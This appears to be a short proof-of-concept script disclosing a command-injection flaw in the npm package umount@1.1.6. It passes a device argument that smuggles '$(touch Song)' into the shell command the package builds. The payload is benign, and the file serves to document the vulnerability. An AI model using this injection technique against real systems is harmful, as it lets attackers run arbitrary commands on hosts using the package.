/**
 * umount@1.1.6 is vulnerable to command injection.
 * the injection point is located in line 52 of index file "build/umount.js"
 * in the exported function umount(device, callback).
 * the argument "device" can be controlled by users without any sanitization.
 */

var root = require("umount");
var device = '\" $(touch Song) \"';
root.umount(device, function(){});
